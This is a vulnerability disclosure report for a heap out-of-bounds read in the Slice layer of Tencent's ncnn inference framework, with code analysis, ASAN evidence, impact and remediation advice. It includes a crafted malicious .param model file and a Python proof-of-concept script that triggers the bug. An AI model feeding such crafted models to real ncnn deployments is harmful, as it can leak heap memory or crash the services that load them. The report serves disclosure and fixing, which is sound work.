# ncnn-13-Slice Length Out-of-Bounds Read

> Public status: No public CVE found for the same issue; ncnn also has CVE-2026-50144/112073/112074 (different functions/fields).

## Submission Fields

- **Vendor**: Tencent
- **Product**: ncnn
- **Version or Commit**: b0f1deb6183d7b3b5cd70dd47c95bb6c91ee038e
- **Vulnerability Class**: Out-of-Bounds Read

## Vulnerability Submission Details

- **Product and Version**: Tencent ncnn
- **Vulnerability Name**: ncnn Slice length out-of-bounds read vulnerability
- **Product Usage**: GitHub Tencent/ncnn (a C++ framework widely used for mobile/embedded inference. 24.1k stars)

<img width="2553" height="1470" alt="image" src="https://github.com/user-attachments/assets/7685d426-cdd8-4749-aaac-3ab9eec335ac" />


- **Exploitation Conditions**: User interaction required
- **Description**: The ncnn Slice layer takes slices/indices from the .param directly as output lengths without validating them against the actual length of the input blob. When slices is far larger than the input length, memcpy reads a large amount of data from the short input buffer, causing a heap out-of-bounds read and writing adjacent memory into the output tensor.
- **Details**: Source: the 0=slices (or indices) and the output count of Slice in a malicious .param. Sink: src/layer/slice.cpp:60-103 (dims==1 branch: top_blob.create(slice); memcpy(outptr, ptr, slice*elemsize)), load_param :12-49 only checks slices>0/-233 and does not check the upper bound; x86 vectorized kernel build-asan/src/layer/x86/slice_x86_avx512.cpp:651.
- **Reproduction Environment**: Ubuntu Linux 6.11.0-29, g++ 14, AddressSanitizer; ncnn commit b0f1deb6183d7b3b5cd70dd47c95bb6c91ee038e. ASAN builds a static library (NCNN_VULKAN=OFF, NCNN_OPENMP=OFF); a minimal Net loads the param and forwards.
- **Exploitation Details**: 1. Craft poc_slice.param: Input is 10x1x1, Slice slices=[1000000,1].  
  2. Run python exp.py.  
  3. AddressSanitizer reports heap-buffer-overflow, READ of size 4, with the stack pointing to slice_x86_avx512.cpp:651; the out-of-bounds location is 28 bytes after the 116-byte input allocation; exit code -6.



## Detailed Vulnerability Analysis

### 1. Analysis Path

Starting from the Slice parameter entry in `.param`, verify layer by layer along `load_param()` → `forward()` (the generic implementation and the x86 optimized implementation) whether "the parameters are consistency-checked against the input size", and finally validate with a minimal `Net` harness built with ASAN.

- Parameter entry: `src/layer/slice.cpp:12-49` `Slice::load_param()`.
- Generic forward: `src/layer/slice.cpp:60-103` (the `dims == 1` branch).
- x86 forward: `src/layer/x86/slice_x86.cpp:28-96`; AVX512 generated code `build-asan/src/layer/x86/slice_x86_avx512.cpp:651` (ASAN hit point).

### 2. Parameter Semantics and Validation Gaps

The `.param` parameters of Slice are:

- `0=slices`: the array of slice lengths for each output;
- `1=axis`: the slice axis;
- `2=indices`: an optional array of split points;
- The number of output blobs is given by the param line.

When `NCNN_VALIDATION` is enabled, `load_param()` only checks: the array type/dimension is valid, `slices[i] > 0` (or the special value `-233`), and `axis` is in `[-4,3]`; **it does not check the relation between `slices[i]` and the input `w`, nor `sum(slices) <= w`**. Release builds usually do not define `NCNN_VALIDATION`, in which case even the above positivity check is absent, and `slices` is entirely determined by the model file.

The `indices` branch likewise has no range/monotonicity validation: `positive_indice = indice < 0 ? w + indice : indice; slice = positive_indice - q;`; `indice` may be out of range or smaller than `q`, producing a negative/oversized `slice`.

### 3. dims==1 Generic forward

The 1-dimensional branch of `src/layer/slice.cpp`:

```cpp
int w = bottom_blob.w;
int q = 0;
for (size_t i = 0; i < top_blobs.size(); i++) {
    int slice = slices_ptr[i];          // attacker-controlled, not compared with w-q
    Mat& top_blob = top_blobs[i];
    top_blob.create(slice, elemsize, opt.blob_allocator);
    const unsigned char* ptr = (const unsigned char*)bottom_blob + q * elemsize;
    memcpy(outptr, ptr, slice * elemsize);   // reads slice elements from a short input
    q += slice;
}
```

When `slice > w - q`:

- `top_blob` is allocated according to `slice`, and the **write** stays within the output buffer;
- `memcpy` reads `slice * elemsize` bytes starting from `bottom_blob + q`, so the **read** runs past the input buffer;
- After `q += slice`, `q` can exceed `w`, and subsequent outputs continue reading from farther addresses.

### 4. x86 Optimized Path

`Slice_x86::forward` uses the same `slices_ptr`, first computes `out_elempack` from `slice` and calls `top_blob.create(slice / out_elempack, ...)`, then enters the vectorized copy branch. For each output position of `top_blob`, the AVX512 path loads values consecutively from the 16 channel pointers of `bottom_blob_unpacked`; the larger `slice` is, the larger the loop count `size` and the farther the reads, eventually running past the input buffer. The top of the ASAN stack is this vectorized read (`slice_x86_avx512.cpp:651`).

### 5. Trigger and ASAN Evidence

Construct `poc_slice.param`:

```text
7767517
2 3
Input in 0 1 data 0=10 1=1 2=1
Slice s 1 2 data out0 out1 0=1000000,1 1=0
```

That is, input `w=10`, Slice `slices=[1000000, 1]`, two outputs. The first `slice=1000000` is far larger than `w=10`, and `memcpy` reads about 4 MB from the 40-byte input; for the second `slice=1`, `q` already exceeds `w`.

ASAN result: `heap-buffer-overflow`, `READ of size 4`, the stack points to `slice_x86_avx512.cpp:651`; the out-of-bounds address is 28 bytes after the 116-byte input allocation, and the process exits with `-6`.

### 6. Impact

- A heap out-of-bounds read of controllable length; the read content is written into the output tensor; the caller `Extractor::extract()` can retrieve the output, constituting an adjacent-heap-memory leak (possibly including pointers/keys, etc.).
- A very large `slice` causes a large allocation/long copy, which can lead to memory exhaustion or a crash (DoS).
- It is not an out-of-bounds write: the output buffer is allocated according to `slice`, and the write itself stays in bounds; therefore it does not directly constitute RCE, but can serve as an information-disclosure primitive.

### 7. Fix Boundary

Uniformly validate before entering the copy in `load_param()` or `forward()`:

- For `slices`: each value `> 0`, and `slices[i] <= w - q`, `sum(slices) == w` (or at least `<= w`);
- For `indices`: each value in `[0, w]` and monotonically increasing;
- `top_blobs.size()` matches the length of the `slices/indices` array;
- The x86/generic paths share the same validation, to avoid fixing only one path.

## PoC Details

Usage:
    python exp.py
Dependencies:
    Python 3.8+, standard library only
    A locally built ASAN ncnn harness (default /home/ddl/ai-audit/repro/ncnn/poc_slice)
Notes:
    The script generates poc_slice.param (Input w=10 + Slice slices=[1000000,1]) and calls the harness;

```
#!/usr/bin/env python3
# ncnn Slice slices/indices not validated against input length
import os, subprocess, sys, tempfile
HARNESS = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("NCNN_SLICE_POC", "/home/ddl/ai-audit/repro/ncnn/poc_slice")
PARAM = """7767517
2 3
Input in 0 1 data 0=10 1=1 2=1
Slice s 1 2 data out0 out1 0=1000000,1 1=0
"""
def main():
    if not os.path.isfile(HARNESS):
        print("[!] harness not found: %s" % HARNESS); return 2
    with tempfile.TemporaryDirectory() as td:
        open(os.path.join(td,"poc_slice.param"),"w").write(PARAM)
        open(os.path.join(td,"poc_slice.bin"),"wb").write(b"\0"*64)
        env = dict(os.environ, ASAN_OPTIONS="detect_leaks=0:abort_on_error=1")
        p = subprocess.run([HARNESS], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env, cwd=td)
    out = p.stdout
    print("[*] target: ncnn Slice slices=[1000000,1] on blob w=10")
    print("[*] source: src/layer/slice.cpp:60-103, x86/slice_x86_avx512.cpp:651")
    for line in out.splitlines():
        if any(k in line for k in ("ERROR: AddressSanitizer","READ of size","slice_x86_avx512.cpp:651","SUMMARY: AddressSanitizer")):
            print(line)
    print("[*] exit_code=%d" % p.returncode)
    ok = ("heap-buffer-overflow" in out and "slice_x86_avx512.cpp:651" in out and p.returncode != 0)
    print("RESULT: ncnn Slice length OOB (slice_x86_avx512.cpp:651)" if ok else "RESULT: NOT REPRODUCED")
    return 0 if ok else 1
if __name__ == "__main__":
    sys.exit(main())
```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a83f5c61-916f-47ed-9b42-1af13be964b9" />


## Remediation

In Slice::load_param/forward, validate that each slice/indices value is <= the input length, and sum(slices) <= input; validate that the output count matches the array length; range-check the indices values.
